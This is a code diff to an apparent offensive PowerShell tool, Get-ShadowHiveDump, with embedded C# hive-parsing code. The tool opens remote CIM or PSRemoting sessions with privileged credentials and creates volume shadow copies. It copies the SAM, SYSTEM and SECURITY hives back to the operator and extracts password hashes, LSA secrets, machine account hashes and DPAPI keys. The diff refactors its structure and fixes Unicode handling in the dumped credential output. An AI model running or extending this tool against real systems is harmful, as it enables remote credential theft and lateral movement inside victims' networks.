@@ -15,6 +15,9 @@ Function Get-ShadowHiveDump {
 .PARAMETER ComputerName
     Specifies the target host.
 
+.PARAMETER Ping
+    Ensures host is up before run.
+
 .PARAMETER Credential
     Specifies the privileged account to use.
 
@@ -40,6 +43,9 @@ Function Get-ShadowHiveDump {
         [String]
         $ComputerName = $env:COMPUTERNAME,
 
+        [Switch]
+        $Ping,
+
         [ValidateNotNullOrEmpty()]
         [Management.Automation.PSCredential]
         [Management.Automation.Credential()]
@@ -57,9 +63,21 @@ Function Get-ShadowHiveDump {
         $Force
     )
 
-    BEGIN {
+    Begin {
+        # Optionally check host reachability
+        if ($Ping -and -not $(Test-Connection -Count 1 -Quiet -ComputerName $ComputerName)) {
+            Write-Verbose "[$ComputerName] Host is unreachable."
+            continue
+        }
+
+        # Init variables
         $cimOption = New-CimSessionOption -Protocol $Protocol
         $psOption = New-PSSessionOption -NoMachineProfile
+        $outputDirectory = "$Env:TEMP\$ComputerName"
+    }
+
+    Process {
+        # Init remote sessions
         try {
             if (-not $PSBoundParameters['ComputerName']) {
                 $cimSession = New-CimSession -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
@@ -82,29 +100,28 @@ Function Get-ShadowHiveDump {
         }
         catch [Management.Automation.PSArgumentOutOfRangeException] {
             Write-Warning "Alternative authentication method and/or protocol should be used with implicit credentials."
-            break
+            return
         }
         catch [Microsoft.Management.Infrastructure.CimException] {
             if ($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x8033810c,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
                 Write-Warning "Alternative authentication method and/or protocol should be used with implicit credentials."
-                break
+                return
             }
             if ($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x80070005,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
                 Write-Verbose "[$ComputerName] Access denied."
-                break
+                return
             }
             else {
                 Write-Verbose "[$ComputerName] Failed to establish CIM session."
-                break
+                return
             }
         }
         catch [Management.Automation.Remoting.PSRemotingTransportException] {
             Write-Verbose "[$ComputerName] Failed to establish PSRemoting session."
-            break
+            return
         }
-    }
 
-    PROCESS {
+        # Process shadow copies
         if ($Force) {
             Write-Verbose "[$ComputerName] Creating a shadow copy of volume 'C:\'"
             $process = Invoke-CimMethod -ClassName Win32_ShadowCopy -Name Create -Arguments @{Context="ClientAccessible"; Volume="C:\"} -CimSession $cimSession -ErrorAction Stop -Verbose:$false
@@ -117,9 +134,10 @@ Function Get-ShadowHiveDump {
         }
         if (-not $shadowCopy) {
             Write-Warning "[$ComputerName] No shadow copy available. Please retry with switch '-Force'"
-            break
+            return
         }
 
+        # Process snapshot access
         if ($Protocol -eq 'Wsman') {
             $deviceObject = $shadowCopy.DeviceObject.ToString()
             $tempDir = "C:\Windows\Temp\dump"
@@ -155,7 +173,7 @@ Function Get-ShadowHiveDump {
             [Native]::NtFsControlFile($handle, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [Ref]$ioBlock, 0x00144064, [IntPtr]::Zero, 0, $outBuffer, $bufferSize) | Out-Null
         }
 
-        $outputDirectory = "$Env:TEMP\$ComputerName"
+        # Process file extraction
         New-Item -ItemType Directory -Force -Path $outputDirectory | Out-Null
         Write-Verbose "[$ComputerName] Copying the registry hives into $(Resolve-Path $outputDirectory)"
         if ($Protocol -eq 'Wsman') {
@@ -168,7 +186,7 @@ Function Get-ShadowHiveDump {
             Copy-Item -Path "$securityBackupPath" -Destination "$outputDirectory" -FromSession $psSession
 
             # Delete the shadow link
-            Get-CimInstance -ClassName CIM_LogicalFile -Filter "Name='$($tempDir -Replace '\\','\\')'" -CimSession $cimSession -Verbose:$false | Remove-CimInstance -Verbose:$false
+            Get-CimInstance -ClassName CIM_LogicalFile -Filter "Name='$($tempDir.Replace('\','\\'))'" -CimSession $cimSession -Verbose:$false | Remove-CimInstance -Verbose:$false
         }
         else {
             # Download files via SMB
@@ -197,14 +215,16 @@ Function Get-ShadowHiveDump {
         if ($result = [HiveParser]::ParseSecrets("$outputDirectory\SAM", "$outputDirectory\SYSTEM", "$outputDirectory\SECURITY")) {
             Write-Output "[$ComputerName] Successful dump`n$result"
         }
-
-        # Delete local copy
-        Remove-Item -Recurse $outputDirectory
     }
 
-    END {
-        Remove-CimSession -CimSession $cimSession
-        if ($Protocol -eq 'Wsman') {
+    End {
+        # Delete local copies
+        Remove-Item -Recurse -Force -Path $outputDirectory -ErrorAction SilentlyContinue
+        # End remote sessions
+        if ($cimSession) {
+            Remove-CimSession -CimSession $cimSession
+        }
+        if ($psSession) {
             Remove-PSSession -Session $psSession
         }
     }
@@ -213,8 +233,7 @@ Function Get-ShadowHiveDump {
 # Adapted from PowerView by @harmj0y and @mattifestation
 Function Local:Invoke-UserImpersonation {
     [OutputType([IntPtr])]
-    [CmdletBinding(DefaultParameterSetName = 'Credential')]
-    Param(
+    Param (
         [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
@@ -256,8 +275,7 @@ Function Local:Invoke-UserImpersonation {
 }
 
 Function Local:Invoke-RevertToSelf {
-    [CmdletBinding()]
-    Param(
+    Param (
         [ValidateNotNull()]
         [IntPtr]
         $TokenHandle
@@ -718,7 +736,7 @@ public class Registry
             string computerAcctHash = BitConverter.ToString(Crypto.Md4Hash2(secretBlob.secret)).Replace("-", "").ToLower();
             ValueKey domainName = GetValueKey(system, @"ControlSet001\Services\Tcpip\Parameters\Domain");
             ValueKey computerName = GetValueKey(system, @"ControlSet001\Services\Tcpip\Parameters\Hostname");
-            secretOutput += string.Format("{0}\\{1}$:aad3b435b51404eeaad3b435b51404ee:{2}", Encoding.UTF8.GetString(domainName.Data), Encoding.UTF8.GetString(computerName.Data), computerAcctHash);
+            secretOutput += string.Format("{0}\\{1}$:aad3b435b51404eeaad3b435b51404ee:{2}", Encoding.Unicode.GetString(domainName.Data).TrimEnd('\0'), Encoding.Unicode.GetString(computerName.Data).TrimEnd('\0'), computerAcctHash);
         }
         else if (keyName.ToUpper().StartsWith("DPAPI"))
         {
